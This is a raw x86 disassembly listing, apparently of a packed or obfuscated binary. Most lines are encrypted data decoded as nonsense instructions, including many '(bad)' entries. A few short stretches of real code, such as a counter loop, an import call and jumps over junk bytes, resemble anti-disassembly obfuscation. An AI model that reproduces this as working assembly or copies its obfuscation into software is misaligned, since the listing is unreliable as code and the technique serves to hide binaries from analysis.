  40ad6e:	add    al,0x35
  40ad70:	pushf  
  40ad71:	ss add esp,edx
  40ad74:	push   ebp
  40ad75:	lock cdq 
  40ad77:	xchg   dl,cl
  40ad79:	and    eax,0xbfb3e18e
  40ad7e:	xchg   DWORD PTR [ecx-0x1f],esp
  40ad81:	aaa    
  40ad82:	adc    DWORD PTR [esi-0x6b],ebx
  40ad85:	ss ret 0xc8d7
  40ad89:	mov    edx,0x77c12d09
  40ad8e:	inc    ecx
  40ad8f:	ins    BYTE PTR es:[edi],dx
  40ad90:	repnz call 0xed18:0x445e7a0
  40ad98:	ins    DWORD PTR es:[edi],dx
  40ad99:	cmp    BYTE PTR [ecx],bh
  40ad9b:	ss cwde 
  40ad9d:	cmp    eax,0xdc778e29
  40ada2:	inc    ecx
  40ada3:	push   edi
  40ada4:	mov    gs,edi
  40ada6:	into   
  40ada7:	push   ebx
  40ada8:	pop    ds
  40ada9:	sti    
  40adaa:	and    BYTE PTR [ecx-0x71],dl
  40adad:	or     bh,ah
  40adaf:	pop    esp
  40adb0:	(bad)  
  40adb1:	outs   dx,BYTE PTR ds:[esi]
  40adb2:	shl    ebx,cl
  40adb4:	clc    
  40adb5:	jb     0x40adae
  40adb7:	inc    esp
  40adb8:	adc    edx,DWORD PTR [eax+0x8de51c7]
  40adbe:	xor    al,0xb
  40adc0:	jae    0x40ad5d
  40adc2:	mov    edi,0x2e6711e0
  40adc7:	mov    bl,0xe1
  40adc9:	pop    edx
  40adca:	ud2    
  40adcc:	mov    ebx,0x8434cc9f
  40add1:	mov    ebp,?
  40add3:	mov    ds:0xa035da29,eax
  40add8:	xor    eax,0x730c09a2
  40addd:	dec    BYTE PTR [edi]
  40addf:	mov    ebp,0x520e1e8c
  40ade4:	(bad)  [ebx-0x64]
  40ade7:	jne    0x40ae58
  40ade9:	jmp    FWORD PTR [esi+ecx*1+0x26]
  40aded:	js     0x40ada1
  40adef:	leave  
  40adf0:	mov    ch,0x4e
  40adf2:	cmp    dh,BYTE PTR [edi]
  40adf4:	in     al,0x70
  40adf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adf7:	iret   
  40adf8:	sub    DWORD PTR [edi],edi
  40adfa:	js     0x40ae5b
  40adfc:	and    cl,BYTE PTR [ecx]
  40adfe:	jmp    0xf275cac6
  40ae03:	sub    al,0x18
  40ae05:	js     0x40adfc
  40ae07:	mov    ebx,0x7d2ec42d
  40ae0c:	hlt    
  40ae0d:	test   DWORD PTR [edi],ebp
  40ae0f:	adc    ch,BYTE PTR [eax+0x56487614]
  40ae15:	in     al,0xd9
  40ae17:	xchg   edx,eax
  40ae18:	mov    eax,ds:0x5b60c33b
  40ae1d:	icebp  
  40ae1e:	scas   eax,DWORD PTR es:[edi]
  40ae1f:	loopne 0x40ae6b
  40ae21:	xor    edi,esi
  40ae23:	mov    bh,0x45
  40ae25:	and    BYTE PTR [ecx-0x695fdffd],dl
  40ae2b:	pop    ebp
  40ae2c:	rol    BYTE PTR [esi+0x55],1
  40ae2f:	test   al,0xa3
  40ae31:	xchg   edi,eax
  40ae32:	data16 data16 arpl WORD PTR [edi],si
  40ae36:	enter  0x482,0x12
  40ae3a:	push   0x96b65392
  40ae3f:	dec    esi
  40ae40:	jne    0x40aeb0
  40ae42:	cmp    DWORD PTR [edi-0xe9189a0],esp
  40ae48:	push   ebx
  40ae49:	loope  0x40ae37
  40ae4b:	push   esp
  40ae4c:	mov    edi,0x568aa814
  40ae51:	sbb    BYTE PTR [ebp-0x6f],ch
  40ae54:	xor    al,0xa2
  40ae56:	outs   dx,DWORD PTR ds:[esi]
  40ae57:	jmp    0x74bb8ecd
  40ae5c:	daa    
  40ae5d:	test   al,0x6f
  40ae5f:	not    BYTE PTR [eax]
  40ae61:	xor    dl,BYTE PTR [edi-0x1]
  40ae64:	inc    eax
  40ae65:	inc    ecx
  40ae66:	push   cs
  40ae67:	in     al,0xa
  40ae69:	rcr    DWORD PTR [edi+0x60ec8af0],1
  40ae6f:	test   DWORD PTR ds:[edi],ebp
  40ae72:	sahf   
  40ae73:	js     0x40ae86
  40ae75:	pop    ecx
  40ae76:	jns    0x40ae74
  40ae78:	mov    ds:0x160e726f,eax
  40ae7d:	fdivr  QWORD PTR [eax-0x15]
  40ae80:	fwait
  40ae81:	xchg   edi,eax
  40ae82:	(bad)
  40ae86:	dec    edi
  40ae87:	lahf   
  40ae88:	xchg   esp,eax
  40ae89:	stc    
  40ae8a:	mov    eax,0x1b2ee2e9
  40ae8f:	in     eax,dx
  40ae90:	and    eax,0x3d965100
  40ae95:	repz xor eax,0xe9364a40
  40ae9b:	cmp    eax,0x72a824a
  40aea0:	xadd   BYTE PTR fs:[ebx],bl
  40aea4:	aad    0x1a
  40aea6:	add    al,0x8d
  40aea8:	scas   eax,DWORD PTR es:[edi]
  40aea9:	or     dh,dl
  40aeab:	dec    ebp
  40aeac:	test   BYTE PTR [esi-0x45],al
  40aeaf:	(bad)  
  40aeb0:	lea    ecx,[ebp-0x2e]
  40aeb3:	ins    DWORD PTR es:[edi],dx
  40aeb4:	mov    al,BYTE PTR [ebp-0x7c]
  40aeb7:	inc    eax
  40aeb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aeb9:	lea    esp,[bx+0x1b65]
  40aebe:	jmp    0x40aeed
  40aec0:	(bad)  
  40aec1:	xor    al,0xab
  40aec3:	sub    BYTE PTR [ecx-0xe],bh
  40aec6:	cmovle esi,esp
  40aec9:	push   es
  40aeca:	mov    eax,ds:0xf9b46957
  40aecf:	dec    eax
  40aed0:	repnz or dl,ah
  40aed3:	inc    ebp
  40aed4:	push   edx
  40aed5:	dec    edi
  40aed6:	push   0x272916ff
  40aedb:	rcl    BYTE PTR [ebp+ecx*8-0x51302536],0x29
  40aee3:	mov    dl,cl
  40aee5:	push   edi
  40aee6:	loope  0x40af3c
  40aee8:	int    0x2e
  40aeea:	cmp    al,0x94
  40aeec:	jne    0x40ae79
  40aeee:	adc    eax,0xc8c782aa
  40aef3:	mov    dh,0xd8
  40aef5:	sti    
  40aef6:	jmp    0x40af0d
  40aef8:	push   cs
  40aef9:	lods   al,BYTE PTR ds:[esi]
  40aefa:	xchg   edi,eax
  40aefb:	pop    ebx
  40aefc:	jecxz  0x40af78
  40aefe:	pop    esp
  40aeff:	jno    0x40aed6
  40af01:	push   esp
  40af02:	xchg   ebx,eax
  40af03:	cs xchg esi,eax
  40af05:	mov    edx,edx
  40af07:	add    edi,DWORD PTR [eax+0x303105a2]
  40af0d:	into   
  40af0e:	sub    ebp,DWORD PTR gs:[ebx+0x26]
  40af12:	test   al,0xa2
  40af14:	push   eax
  40af15:	shr    BYTE PTR [ecx],0x5
  40af18:	data16 scas al,BYTE PTR es:[edi]
  40af1a:	es mov dh,0x4a
  40af1d:	jne    0x40af2c
  40af1f:	inc    ebx
  40af20:	xor    BYTE PTR [esi+0xf],dl
  40af23:	fsub   QWORD PTR [eax-0x4a3db56b]
  40af29:	jo     0x40af17
  40af2b:	push   ss
  40af2c:	rcl    esi,cl
  40af2e:	lds    eax,FWORD PTR [ebx-0x1a30d764]
  40af34:	xor    DWORD PTR [esi+0x0],ebx
  40af37:	push   ebx
  40af38:	sbb    DWORD PTR [ecx-0x14feaee0],0x16
  40af3f:	mov    cl,0x15
  40af41:	cmp    al,0x60
  40af43:	pop    ebp
  40af44:	gs out 0x16,al
  40af47:	push   ebx
  40af48:	nop
  40af49:	pusha  
  40af4a:	(bad)  
  40af4c:	outs   dx,DWORD PTR ds:[esi]
  40af4d:	push   ds
  40af4e:	out    dx,al
  40af4f:	add    ebp,DWORD PTR [eax+eax*4]
  40af52:	mov    eax,0xb4df480f
  40af57:	retf   0xbbfc
  40af5a:	inc    ebp
  40af5b:	cmp    cl,0xaf
  40af5e:	adc    eax,DWORD PTR [edx+0x51]
  40af61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af62:	push   ebp
  40af63:	fmulp  st(4),st
  40af65:	cmp    DWORD PTR [edi],ebx
  40af67:	dec    ecx
  40af68:	fisub  WORD PTR [ebx]
  40af6a:	test   esi,0x5dfe04c9
  40af70:	outs   dx,DWORD PTR ds:[esi]
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	fsubr  st(7),st
  40b019:	ins    DWORD PTR es:[edi],dx
  40b01a:	dec    ebx
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b024:	das    
  40b025:	inc    esp
  40b026:	xchg   dh,al
  40b028:	push   ecx
  40b029:	in     al,dx
  40b02a:	xor    dl,BYTE PTR [ebx+0x2d52cc29]
  40b030:	and    BYTE PTR [ebx-0x9],bl
  40b033:	lods   al,BYTE PTR ds:[esi]
  40b034:	jl     0x40afdb
  40b036:	mov    esi,0xb4ce7ffc
  40b03b:	xchg   edi,eax
  40b03c:	jle    0x40b027
  40b03e:	fs push ebp
  40b040:	call   0x787a:0xc81dcd3c
  40b047:	test   BYTE PTR [edi],dl
  40b049:	stos   BYTE PTR es:[edi],al
  40b04a:	(bad)  
  40b04b:	data16 das 
  40b04d:	stos   BYTE PTR es:[edi],al
  40b04e:	bound  esp,QWORD PTR es:[ebx]
  40b051:	jp     0x40b067
  40b053:	lock mov ebp,0x35ebb383
  40b059:	sub    edx,DWORD PTR [esi-0x58f0916b]
  40b05f:	cmp    esi,DWORD PTR [esi+0xd]
  40b062:	int3   
  40b063:	test   eax,0xddc7dce7
  40b069:	xchg   BYTE PTR [ecx+edx*4],dh
  40b06c:	add    ah,ch
  40b06e:	and    BYTE PTR [ebp+0x16093ed4],al
  40b074:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40b076:	sbb    ah,bh
  40b078:	mov    dh,0xda
  40b07a:	dec    edx
  40b07b:	pop    ecx
  40b07c:	mov    DWORD PTR [ebx-0x4c235e6c],0xa6c43520
  40b086:	cmp    al,0x60
  40b088:	lods   eax,DWORD PTR ds:[esi]
  40b089:	fcmovnbe st,st(7)
  40b08b:	inc    esi
  40b08c:	add    esi,DWORD PTR [ecx]
  40b08e:	jo     0x40b07b
  40b090:	aam    0xff
  40b092:	shl    BYTE PTR [ecx-0x25],0x82
  40b096:	mov    edi,0xcd3d4bde
  40b09b:	bnd jae 0x40b0c1
  40b09e:	jecxz  0x40b048
  40b0a0:	mov    DWORD PTR [eax],ebp
  40b0a2:	sub    DWORD PTR [eax],ebp
  40b0a4:	lods   eax,DWORD PTR ds:[esi]
  40b0a5:	fstp   TBYTE PTR [ebx]
  40b0a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0a8:	outs   dx,BYTE PTR ds:[esi]
  40b0a9:	loope  0x40b127
  40b0ab:	lea    ebx,[esi+0x61]
  40b0ae:	pop    ss
  40b0af:	loopne 0x40b089
  40b0b1:	mov    WORD PTR [ebp-0x77e54577],fs
  40b0b7:	push   ecx
  40b0b8:	ret    
  40b0b9:	imul   edi,DWORD PTR [esi-0x15],0xffffff98
  40b0bd:	(bad)  
  40b0be:	mov    al,ds:0x8ceeb319
  40b0c3:	add    DWORD PTR [eax],ebp
  40b0c5:	lahf   
  40b0c6:	xor    eax,0xeacd0992
  40b0cb:	(bad)  
  40b0cc:	fsubr  DWORD PTR [esi+ebx*2-0x160c9217]
  40b0d3:	aaa    
  40b0d4:	mov    ch,0x7d
  40b0d6:	push   ss
  40b0d7:	dec    edi
  40b0d8:	or     edx,DWORD PTR [edx+0x56]
  40b0db:	push   0xffffffe0
  40b0dd:	dec    ebp
  40b0de:	(bad)  
  40b0df:	push   ss
  40b0e0:	ror    BYTE PTR [esi],cl
  40b0e2:	xchg   esp,eax
  40b0e3:	js     0x40b0db
  40b0e5:	jo     0x40b084
  40b0e7:	pushf  
  40b0e8:	xor    eax,0xfa98ca1e
  40b0ed:	ret    
  40b0ee:	cli    
  40b0ef:	retf   
  40b0f0:	and    DWORD PTR [ecx],ebx
  40b0f2:	and    dl,BYTE PTR [esi+0x1e]
  40b0f5:	and    BYTE PTR [esi],dl
  40b0f7:	cdq    
  40b0f8:	das    
  40b0f9:	fbstp  TBYTE PTR [eax-0x2ad7f7a0]
  40b0ff:	fidiv  DWORD PTR [ecx]
  40b101:	xor    DWORD PTR [ecx],0xf247eedc
  40b107:	into   
  40b108:	scas   al,BYTE PTR es:[di]
  40b10a:	or     BYTE PTR [ebx-0x36],0x71
  40b10e:	sub    al,0x81
  40b110:	arpl   WORD PTR [edx-0x25eaaa13],si
  40b116:	inc    edx
  40b117:	xchg   ebp,eax
  40b118:	push   eax
  40b119:	add    ebx,ecx
  40b11b:	aas    
  40b11c:	inc    edi
  40b11d:	and    DWORD PTR [ecx+0x73],eax
  40b120:	xor    esp,ebx
  40b122:	retf   
  40b123:	sbb    BYTE PTR [ecx+0x6b],bl
  40b126:	sub    BYTE PTR [edx+0x7869e491],dh
  40b12c:	pushf  
  40b12d:	mov    dl,0x2
  40b12f:	int    0x25
  40b131:	sub    cl,ah
  40b133:	xchg   ebx,eax
  40b134:	enter  0xfabd,0x62
  40b138:	and    al,al
  40b13a:	(bad)  
  40b13c:	shl    DWORD PTR [edx+0x3e],1
  40b13f:	mov    al,BYTE PTR ds:0x19fef58e
  40b145:	das    
  40b146:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40b148:	mov    fs,WORD PTR [edi]
  40b14a:	ins    DWORD PTR es:[edi],dx
  40b14b:	jle    0x40b123
  40b14d:	xor    edi,0x902bb5a7
  40b153:	and    ch,al
  40b155:	sub    DWORD PTR [si],esi
  40b158:	pop    ebx
  40b159:	fistp  DWORD PTR [esi]
  40b15b:	or     eax,0x60c2f49b
  40b160:	sbb    ch,dh
  40b162:	mov    dl,0xa9
  40b164:	sti    
  40b165:	xor    BYTE PTR [edi+0x82b900d],ch
  40b16b:	and    edi,0xc7c9d595
  40b171:	test   DWORD PTR [ebp-0x875c393],eax
  40b177:	aaa    
  40b178:	stc    
  40b179:	cmp    bl,BYTE PTR [ebx-0x31a79f64]
  40b17f:	iret   
  40b180:	test   eax,0x72caa473
  40b185:	in     al,dx
  40b186:	jb     0x40b136
  40b188:	xlat   BYTE PTR ds:[ebx]
  40b189:	fbld   TBYTE PTR [edx-0x773aab89]
  40b18f:	bound  edx,QWORD PTR [ebx-0x137f0c2e]
  40b195:	jbe    0x40b162
  40b197:	test   al,0xae
  40b199:	inc    eax
  40b19a:	and    BYTE PTR [ebx],cl
  40b19c:	(bad)  
  40b19d:	loop   0x40b1cf
  40b19f:	inc    edx
  40b1a0:	adc    ebp,ecx
  40b1a2:	and    al,0xcf
  40b1a4:	arpl   bp,si
  40b1a6:	adc    esi,0xffffffc5
  40b1a9:	dec    esi
  40b1aa:	inc    esi
  40b1ab:	jge    0x40b15a
  40b1ad:	loopne 0x40b165
  40b1af:	dec    edx
  40b1b0:	sahf   
  40b1b1:	cld    
  40b1b2:	nop
  40b1b3:	xchg   edx,eax
  40b1b4:	sbb    ebx,DWORD PTR [edi+0x61]
  40b1b7:	push   ebx
  40b1b8:	adc    dl,BYTE PTR [ebx]
  40b1ba:	sbb    al,0xfc
  40b1bc:	sbb    dh,bl
  40b1be:	pop    ecx
  40b1bf:	sub    edi,DWORD PTR [edi+0x15]
  40b1c2:	push   0x4e810b7b
  40b1c7:	mov    ebx,gs
  40b1c9:	add    esp,ebp
  40b1cb:	mov    di,0x47c0
  40b1cf:	push   ebp
  40b1d0:	int3   
  40b1d1:	xor    bl,BYTE PTR [eax+0x2c]
  40b1d4:	(bad)  
  40b1d5:	(bad)  [ebx+0x13a52cbe]
  40b1db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1dc:	pop    eax
  40b1dd:	push   ds
  40b1de:	or     esi,DWORD PTR [edx+0x1d24c741]
  40b1e4:	aam    0xb
  40b1e6:	adc    al,0x85
  40b1e8:	xchg   edx,eax
  40b1e9:	cmp    eax,0xbdc3822f
  40b1ee:	mov    al,0xf9
  40b1f0:	sub    edi,DWORD PTR [ecx+0x278538e0]
  40b1f6:	sub    eax,0x443e0d92
  40b1fb:	fild   WORD PTR [edx-0x47424b6e]
  40b201:	out    dx,al
  40b202:	das    
  40b203:	call   0x6f43322d
  40b208:	xor    al,0x20
  40b20a:	xor    esi,esp
  40b20c:	jmp    0x7e25ea4a
  40b211:	xchg   edx,eax
  40b212:	into   
  40b213:	jp     0x40b290
  40b215:	retf   
  40b216:	mov    ch,dh
  40b218:	push   esp
  40b219:	fisttp QWORD PTR [esi+edx*8]
  40b21c:	xor    al,0x98
  40b21e:	gs pusha 
  40b220:	pop    esi
  40b221:	add    dl,BYTE PTR [ebx+ebx*4+0x1ac709a3]
  40b228:	adc    eax,0xe2cebfce
  40b22d:	jle    0x40b299
  40b22f:	jle    0x40b1e0
  40b231:	pop    ss
  40b232:	test   DWORD PTR [esi-0x36],edx
  40b235:	adc    ebx,ecx
  40b237:	add    ah,BYTE PTR [edx+0x4b]
  40b23a:	sbb    ah,BYTE PTR [ecx-0x14]
  40b23d:	nop
  40b23e:	cmp    BYTE PTR [ecx+0x2bba725],dl
  40b244:	xor    BYTE PTR [ecx-0x60],cl
  40b247:	fs jl  0x40b207
  40b24a:	jg     0x40b255
  40b24c:	jmp    0x9565:0x2795f2cd
  40b253:	xchg   ecx,eax
  40b254:	test   DWORD PTR [ebx],0xa611e50c
  40b25a:	sbb    BYTE PTR [esi+0xd],0x9
  40b25e:	xchg   DWORD PTR [ebx-0x74abec76],esi
  40b264:	(bad)  
  40b265:	mov    WORD PTR [edi+0x21],ss
  40b268:	loopne 0x40b1f5
  40b26a:	inc    ebp
  40b26b:	in     al,dx
  40b26c:	mov    ecx,DWORD PTR [ebp+0x8]
  40b26f:	add    ecx,DWORD PTR [eax+0x24]
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	je     0x40b28c
  40b285:	outs   dx,BYTE PTR ds:[esi]
  40b286:	mov    dh,0x2e
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	pop    edi
  40b290:	imul   esi,DWORD PTR [ebx],0x1a1eb8c6
  40b296:	mov    fs,WORD PTR [esi]
  40b298:	cmp    DWORD PTR [edx],0xb2f0824d
  40b29e:	jbe    0x40b2e6
  40b2a0:	add    dh,BYTE PTR [ebp-0x6]
  40b2a3:	adc    DWORD PTR [edx-0x64a42af7],ebp
  40b2a9:	jmp    0x40b26e
  40b2ab:	(bad)  
  40b2ac:	mov    ecx,0x3f800f02
  40b2b1:	ret    0xe23e
  40b2b4:	shl    BYTE PTR [ebx-0x35],cl
  40b2b7:	gs pop ebp
  40b2b9:	loope  0x40b294
  40b2bb:	mov    al,ds:0x3a8fc3af
  40b2c0:	stc    
  40b2c1:	bound  edi,QWORD PTR [ebx-0x243ad8ef]
  40b2c7:	pop    eax
  40b2c8:	pushf  
  40b2c9:	in     eax,dx
  40b2ca:	xor    al,BYTE PTR [esi+ebp*8+0x7901c800]
  40b2d1:	dec    edi
  40b2d2:	xchg   ebp,esp
  40b2d4:	shl    DWORD PTR [ebx+0xe4d991f],0x5e
  40b2db:	push   ss
  40b2dc:	cmp    al,0xce
  40b2de:	rcr    bl,0x46
  40b2e1:	ds cli 
  40b2e3:	retf   0xff3c
  40b2e6:	aam    0xc1
  40b2e8:	or     al,0x1e
  40b2ea:	xchg   DWORD PTR [edi-0x11a1c85],ebx
  40b2f0:	dec    ebx
  40b2f1:	and    eax,0xdafc94b4
  40b2f6:	pop    ebx
  40b2f7:	std    
  40b2f8:	int    0x56
  40b2fa:	sbb    esi,edi
  40b2fc:	sbb    eax,0x86b3d9de
  40b301:	add    ecx,DWORD PTR [edx+0x344ac44a]
  40b307:	repz xor DWORD PTR [eax-0x70],0x7c1927d1
  40b30f:	js     0x40b29e
  40b311:	mov    ebp,0x3ff1bde
  40b316:	(bad)  
  40b317:	out    dx,al
  40b318:	addr16 sub ch,bh
  40b31b:	(bad)  
  40b31c:	mov    ebx,0x37dd1529
  40b321:	data16 aam 0x23
  40b324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b325:	icebp  
  40b326:	bound  ebx,QWORD PTR [esi]
  40b328:	lods   al,BYTE PTR ds:[esi]
  40b329:	dec    ecx
  40b32a:	test   eax,0xc8d0ebeb
  40b32f:	dec    edx
  40b330:	ja     0x40b35b
  40b332:	test   BYTE PTR [edx-0x20],bh
  40b335:	jno    0x40b384
  40b337:	shl    DWORD PTR [eax-0xcb09959],0x50
  40b33e:	bnd jo 0x40b3ad
  40b341:	repnz scas al,BYTE PTR es:[edi]
  40b343:	jbe    0x40b2e1
  40b345:	mov    ebx,0xabc3204d
  40b34a:	fnstsw WORD PTR [edi-0x2e]
  40b34d:	mov    ebx,0x94ba6afd
  40b352:	mov    eax,ds:0xb498f147
  40b357:	push   ss
  40b358:	mov    al,ds:0x8eea68c8
  40b35d:	xor    dh,BYTE PTR [ebx+0x1721a193]
  40b363:	jmp    0x40b378
  40b365:	mov    ecx,0x838b6d0b
  40b36a:	clc    
  40b36b:	mov    ds:0xd21b03eb,al
  40b370:	mov    cl,BYTE PTR [eax]
  40b372:	sbb    dl,cl
  40b374:	jg     0x40b35c
  40b376:	mov    ecx,0xdfb83381
  40b37b:	hlt    
  40b37c:	ins    DWORD PTR es:[edi],dx
  40b37d:	adc    al,0x5
  40b37f:	in     al,dx
  40b380:	xchg   DWORD PTR [ecx+0x6e43043c],ebx
  40b386:	(bad)  
  40b387:	daa    
  40b388:	xor    al,0xe
  40b38a:	in     al,dx
  40b38b:	jns    0x40b406
  40b38d:	jp     0x40b372
  40b38f:	pop    eax
  40b390:	add    eax,0xc7f43dbd
  40b395:	dec    ecx
  40b396:	dec    esi
  40b397:	fisttp DWORD PTR [ebp+0x7960374c]
  40b39d:	popa   
  40b39e:	nop
  40b39f:	sub    ecx,DWORD PTR ds:[edi+0x3b]
  40b3a3:	add    ebx,ebp
  40b3a5:	mov    ch,0x71
  40b3a7:	jnp    0x40b3d9
  40b3a9:	pop    ebx
  40b3aa:	cmp    eax,0x992de43c
  40b3af:	mov    es,WORD PTR [ecx-0x2326ae8d]
  40b3b5:	aas    
  40b3b6:	int    0x3e
  40b3b8:	xchg   edi,eax
  40b3b9:	push   ebp
  40b3ba:	(bad)  
  40b3bb:	into   
  40b3bc:	lods   al,BYTE PTR ds:[esi]
  40b3bd:	sub    dl,cl
  40b3bf:	jmp    0x40b41b
  40b3c1:	inc    esp
  40b3c2:	ins    DWORD PTR es:[edi],dx
  40b3c3:	mov    ds:0x6a103ca4,eax
  40b3c8:	lea    ebp,[edx+0x19]
  40b3cb:	dec    edi
  40b3cc:	add    al,0x46
  40b3ce:	fidiv  DWORD PTR [ecx+ebx*8+0x27f9f6a2]
  40b3d5:	mov    bl,0x2a
  40b3d7:	daa    
  40b3d8:	adc    eax,DWORD PTR [esi]
  40b3da:	push   0x636aa8bd
  40b3df:	ror    DWORD PTR [esi],0xf1
  40b3e2:	mov    dh,0x38
  40b3e4:	ret    0xd278
  40b3e7:	call   0x359262b0
  40b3ec:	and    esp,edi
  40b3ee:	ins    BYTE PTR es:[edi],dx
  40b3ef:	leave  
  40b3f0:	mov    ecx,0xc45711df
  40b3f5:	mov    edi,0x8a7bbac
  40b3fa:	sub    DWORD PTR [esi],0x2e665b4d
  40b400:	mov    ecx,0x42f8a5fb
  40b405:	xor    BYTE PTR [eax],bh
  40b407:	fsubr  QWORD PTR [esi]
  40b409:	sbb    ah,BYTE PTR ds:0x82e5bdf5
  40b40f:	fisubr WORD PTR [eax-0x5548131c]
  40b415:	repz out 0xf7,al
  40b418:	cmp    al,0xe2
  40b41a:	or     al,0x4a
  40b41c:	mov    dh,0xc2
  40b41e:	mov    ch,0x7f
  40b420:	inc    esp
  40b421:	xlat   BYTE PTR ds:[ebx]
  40b422:	sbb    ax,WORD PTR ds:0x9527e789
  40b429:	xchg   edx,eax
  40b42a:	sbb    cl,cl
  40b42c:	js     0x40b480
  40b42e:	cmp    al,0xd0
  40b430:	xchg   esp,eax
  40b431:	pop    ecx
  40b433:	loop   0x40b3ec
  40b435:	stc    
  40b436:	(bad)  
  40b437:	dec    ebx
  40b438:	leave  
  40b439:	cld    
  40b43a:	xlat   BYTE PTR ds:[ebx]
  40b43b:	mov    ebx,0xd669ede1
  40b440:	test   BYTE PTR [edx-0x5e622d42],0xc
  40b447:	lods   eax,DWORD PTR ds:[esi]
  40b448:	push   ss
  40b449:	xor    eax,0xa4c0f72a
  40b44e:	push   edx
  40b44f:	lock imul edx,DWORD PTR [edi-0x66],0x1299fc0c
  40b457:	es pop es
  40b459:	dec    ebp
  40b45a:	mov    ecx,0xcb268912
  40b45f:	push   edi
  40b460:	lods   eax,DWORD PTR ds:[esi]
  40b461:	hlt    
  40b462:	stos   BYTE PTR es:[edi],al
  40b463:	sar    BYTE PTR [ebp+0x3f2c06ff],cl
  40b469:	cmp    DWORD PTR [ebp+0x1a722726],edi
  40b46f:	jne    0x40b492
  40b471:	iret   
  40b472:	jns    0x40b4cc
  40b474:	ins    BYTE PTR es:[edi],dx
  40b475:	pop    esi
  40b476:	sbb    bh,BYTE PTR [esi+edi*8+0x4442aab4]
  40b47d:	jmp    0xdc5d5308
  40b482:	add    BYTE PTR [edx-0x32],ah
  40b485:	inc    ecx
  40b486:	add    eax,ebp
  40b488:	xchg   DWORD PTR [eax+0x45],ecx
  40b48b:	cmp    eax,0xc1c45b00
  40b490:	int3   
  40b491:	rcl    DWORD PTR [ecx-0x5c936f78],cl
  40b497:	nop
  40b498:	and    al,BYTE PTR [ebx]
  40b49a:	mov    bh,0xfe
  40b49c:	repnz cld 
  40b49e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b49f:	add    dl,BYTE PTR [esi+edx*4+0x68ec838d]
  40b4a6:	mov    DWORD PTR [ebx+0x2d],ecx
  40b4a9:	or     al,0xcd
  40b4ab:	push   0xffffff85
  40b4ad:	adc    esi,ecx
  40b4af:	pop    ebx
  40b4b0:	imul   eax,DWORD PTR [ebx+0x7],0xef8923fc
  40b4b7:	cld    
  40b4b8:	sbb    ah,ch
  40b4ba:	push   ss
  40b4bb:	mov    ds:0xef6ab39,eax
  40b4c0:	sub    ah,BYTE PTR [esi]
  40b4c2:	test   edx,ebx
  40b4c4:	dec    esi
  40b4c5:	hlt    
  40b4c6:	sub    esp,0x3
  40b4c9:	stos   BYTE PTR es:[edi],al
  40b4ca:	stc    
  40b4cb:	pcmpgtw mm0,mm3
  40b4ce:	mov    edi,DWORD PTR [ecx]
  40b4d0:	sub    BYTE PTR [ebx],ah
  40b4d2:	rcr    DWORD PTR [esp+edi*8-0x77],0x4d
  40b4d7:	aam    0x8b
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	fcomp  DWORD PTR [edx]
  40b509:	aas    
  40b50a:	in     al,0xe8
  40b50c:	lock jle 0x40b58d
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	aam    0xd4
  40b515:	push   ds
  40b516:	std    
  40b517:	(bad)  
  40b518:	imul   esp,DWORD PTR [ebx+0x6a],0x8bff2cf3
